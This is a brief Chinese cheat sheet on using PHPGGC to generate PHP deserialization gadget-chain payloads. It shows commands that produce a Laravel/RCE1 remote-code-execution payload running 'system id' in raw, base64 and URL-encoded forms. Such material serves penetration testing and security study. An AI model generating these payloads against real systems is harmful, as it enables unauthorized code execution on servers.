# PHPGGC 常用用法

PHPGGC 适合 PHP 反序列化 gadget chain 生成。常用参数：链名、函数、参数，`-l` 列链。

```bash
phpggc -l
```

```bash
phpggc Laravel/RCE1 system id
```

```bash
phpggc -b Laravel/RCE1 system id
```

```bash
phpggc -u Laravel/RCE1 system id
```

小记录：PHPGGC 只负责生成 payload。真正能否触发取决于目标依赖版本、反序列化入口和链条可达性。
